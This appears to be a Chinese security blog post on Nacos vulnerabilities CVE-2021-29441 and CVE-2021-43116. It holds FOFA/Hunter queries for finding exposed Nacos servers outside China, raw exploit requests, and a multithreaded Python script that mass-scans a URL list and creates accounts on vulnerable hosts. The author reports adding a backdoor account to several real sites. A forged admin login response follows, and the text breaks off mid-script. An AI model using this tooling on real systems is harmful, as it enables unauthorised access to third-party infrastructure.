@@ -1,0 +1,606 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>Nacos未授权 - Cber</title>
+
+  
+    <meta name="description" content="1.Nacos站点收集 根据站点图标搜集 fofa：(icon_hash&#x3D;&quot;13942501&quot; &amp;&amp; region&#x3D;&quot;HK&quot;) || (icon_hash&#x3D;&quot;13942501&quot; &amp;&amp; country!&#x3D;&quot;CN&quot;) hunter：(web.icon&#x3D;&#x3D;&quot;8f46227059a15">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos未授权">
+<meta property="og:url" content="https://axusun01.github.io/2024/07/05/d9d69101/index.html">
+<meta property="og:site_name" content="Cber">
+<meta property="og:description" content="1.Nacos站点收集 根据站点图标搜集 fofa：(icon_hash&#x3D;&quot;13942501&quot; &amp;&amp; region&#x3D;&quot;HK&quot;) || (icon_hash&#x3D;&quot;13942501&quot; &amp;&amp; country!&#x3D;&quot;CN&quot;) hunter：(web.icon&#x3D;&#x3D;&quot;8f46227059a15">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052007715.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052009890.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052009264.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052011692.png">
+<meta property="article:published_time" content="2024-07-05T12:14:32.000Z">
+<meta property="article:modified_time" content="2024-07-05T12:16:47.144Z">
+<meta property="article:author" content="Cber">
+<meta property="article:tag" content="蓝队">
+<meta property="article:tag" content="攻防演练">
+<meta property="article:tag" content="事件研判">
+<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="安全运营">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052007715.png">
+  
+  
+  
+  <meta name="keywords" content="蓝队,攻防演练,事件研判,应急响应,安全运营">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Cber" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="/images/Cber.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="wiki" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/Cber.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">Cber</div><div class="sub normal cap">要问山下路</div><div class="sub hover cap" style="opacity:0"> 顺问过来人</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/notes/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets"></div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/axusun01/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/476670117" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/Cber.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">Cber</div><div class="sub normal cap">要问山下路</div><div class="sub hover cap" style="opacity:0"> 顺问过来人</div></a></div></header>
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+
+  <span class="sep"></span>
+  <a class="cap breadcrumb" href="/2024/07/05/d9d69101/">Nacos未授权</a>
+  </div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-05T12:14:32.000Z">2024-07-05</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-05T12:16:47.144Z">2024-07-05</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Nacos未授权</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="1-Nacos站点收集"><a href="#1-Nacos站点收集" class="headerlink" title="1.Nacos站点收集"></a>1.Nacos站点收集</h1><ol>
+<li><p>根据站点图标搜集</p>
+<p>fofa：<code>(icon_hash=&quot;13942501&quot; &amp;&amp; region=&quot;HK&quot;) || (icon_hash=&quot;13942501&quot; &amp;&amp; country!=&quot;CN&quot;)</code></p>
+<p>hunter：<code>(web.icon==&quot;8f46227059a154868985a6f64a3e602f&quot;&amp;&amp;ip.province==&quot;中国香港&quot;)||(web.icon==&quot;8f46227059a154868985a6f64a3e602f&quot; &amp;&amp; ip.country!=&quot;中国&quot;</code></p>
+</li>
+<li><p>根据站点title收集站点</p>
+<p>fofa：<code>(title=&quot;Nacos&quot; &amp;&amp; region=&quot;HK&quot;) || (title=&quot;Nacos&quot; &amp;&amp; country!=&quot;CN&quot;)</code></p>
+<p>hunter：<code>(web.title=&quot;Nacos&quot; &amp;&amp; ip.province==&quot;中国香港&quot;) ||(web.title=&quot;Nacos&quot; &amp;&amp; ip.country!=&quot;中国&quot;)</code></p>
+</li>
+<li><p>去重后有208个站点</p>
+</li>
+</ol>
+<h1 id="2-Nacos未授权访问漏洞-CVE-2021-29441"><a href="#2-Nacos未授权访问漏洞-CVE-2021-29441" class="headerlink" title="2. Nacos未授权访问漏洞(CVE-2021-29441)"></a>2. Nacos未授权访问漏洞(CVE-2021-29441)</h1><p>​		<strong>漏洞描述：</strong>该漏洞发生在nacos在进行认证授权操作时，会判断请求的<code>user-agent</code>是否为<strong>”Nacos-Server”</strong>，如果是的话则不进行任何认证。</p>
+<p>​		<strong>影响版本: Nacos &lt;&#x3D; 2.0.0-ALPHA.1</strong></p>
+<p>　　<strong>漏洞编号：CVE-2021-29441</strong></p>
+<p>​		参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/thespace/p/16777691.html">https://www.cnblogs.com/thespace/p/16777691.html</a></p>
+<p>漏洞利用过程如下：</p>
+<ol>
+<li><p>修改User-Agent的值为Nacos-Server到请求包中</p>
+</li>
+<li><p>访问<a target="_blank" rel="noopener" href="http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9%E6%9F%A5%E7%9C%8B%E7%8A%B6%E6%80%81%E7%A0%81%E6%98%AF%E5%90%A6%E4%B8%BA200%EF%BC%8C%E4%B8%94%E5%86%85%E5%AE%B9%E4%B8%AD%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%60pageItems%60">http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9查看状态码是否为200，且内容中是否包含`pageItems`</a></p>
+</li>
+<li><p>使用POST方式访问<a target="_blank" rel="noopener" href="http://target:8848/nacos/v1/auth/users%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%94%A8%E6%88%B7">http://target:8848/nacos/v1/auth/users添加一个新用户</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /nacos/v1/auth/users HTTP/1.1</span><br><span class="line">Host: ****</span><br><span class="line">accept: */*</span><br><span class="line">User-Agent: Nacos-Server</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">username=***&amp;password=****</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问<a target="_blank" rel="noopener" href="http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9%E8%8E%B7%E5%8F%96%E5%B7%B2%E6%9C%89%E7%9A%84%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8">http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9获取已有的用户列表</a></p>
+</li>
+<li><p>访问<a target="_blank" rel="noopener" href="http://target:8848/nacos/%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%B7%BB%E5%8A%A0%E7%9A%84%E6%96%B0%E7%94%A8%E6%88%B7(vulhub/vulhub)%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95">http://target:8848/nacos/，使用添加的新用户(vulhub/vulhub)进行登录</a></p>
+</li>
+</ol>
+<p>漏洞利用脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import concurrent.futures</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">myheaders = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Nacos-Server&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def add_user(url):</span><br><span class="line">    add_user_endpoint = &quot;/nacos/v1/auth/users?username=***&amp;password=*****&quot;</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url + add_user_endpoint, headers=myheaders, timeout=10, verify=False)</span><br><span class="line">        print(r.text)</span><br><span class="line">        if r.status_code == 200 and &quot;create user ok&quot; in r.text:</span><br><span class="line">            print(&quot;Add User Success&quot;)</span><br><span class="line">            print(&quot;New User Info: ***/*****&quot;)</span><br><span class="line">            print(&quot;Nacos Login Endpoint: &#123;&#125;/nacos/&quot;.format(url))</span><br><span class="line">            print(&quot;====================================&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Add User Failed&quot;)</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        add_user(url)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def Nacos_unauthorized(url):</span><br><span class="line">    try:</span><br><span class="line">        endpoint = &quot;/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&quot;</span><br><span class="line">        </span><br><span class="line">        #检验是否存在Nacos未授权漏洞</span><br><span class="line">        response1 = requests.get(url + endpoint, headers=myheaders, timeout=10, verify=False)</span><br><span class="line">        if response1.status_code == 200 and &quot;pageItems&quot; in response1.text:</span><br><span class="line">            print(url + &quot; has vulnerabilities&quot;)</span><br><span class="line">            #存在漏洞则创建用户</span><br><span class="line">            add_user(url)</span><br><span class="line">        #else:</span><br><span class="line">            #print(url + &quot; has not vulnerabilities&quot;)</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        Nacos_unauthorized(url)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;please input url.txt&quot;)</span><br><span class="line">    else:</span><br><span class="line">        file_path = sys.argv[1]</span><br><span class="line">        with open(file_path, &quot;r&quot;) as file:</span><br><span class="line">            # 读取文件的每一行</span><br><span class="line">            lines = file.readlines()</span><br><span class="line">            #for line in lines:</span><br><span class="line">            #    print(line.strip())  </span><br><span class="line">            with concurrent.futures.ThreadPoolExecutor() as executor:</span><br><span class="line">                # 提交任务给线程池</span><br><span class="line">                futures = [executor.submit(Nacos_unauthorized,line.strip()) for line in lines]</span><br></pre></td></tr></table></figure>
+
+<p>具有nacos未授权的站点如下，统一新增<code>axu/123456</code>的凭证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://**.254.76.***</span><br><span class="line">http://nacos.*****.net</span><br><span class="line">http://nacos.******.com</span><br><span class="line">https://nacos.*******.com</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="3-Nacos登录绕过漏洞-CVE-2021-43116"><a href="#3-Nacos登录绕过漏洞-CVE-2021-43116" class="headerlink" title="3. Nacos登录绕过漏洞(CVE-2021-43116)"></a>3. Nacos登录绕过漏洞(CVE-2021-43116)</h1><p>参考：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/7182">https://github.com/alibaba/nacos/issues/7182</a></p>
+<p>利用过程：</p>
+<ol>
+<li><p>目前无法正常登录目标站点</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052007715.png" alt="image-20240705200757621"></p>
+<p>利用burpsuite捕获该登录的数据库包，并选择响应该数据包</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052009890.png" alt="image-20240705200908817"></p>
+</li>
+<li><p>原始的响应包</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052009264.png" alt="image-20240705200952197"></p>
+<p>伪造的响应数据包如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Server: nginx/1.19.6</span><br><span class="line">Date: Sun, 11 Apr 2021 01:48:17 GMT</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Origin</span><br><span class="line">Vary: Access-Control-Request-Method</span><br><span class="line">Vary: Access-Control-Request-Headers</span><br><span class="line">Access-Control-Allow-Origin: http://8.218.178.164:8848/</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用伪造的响应包去响应登录请求，成功绕过了登录</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052011692.png" alt="image-20240705201104561"></p>
+</li>
+</ol>
+<p>检测存在漏洞的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span 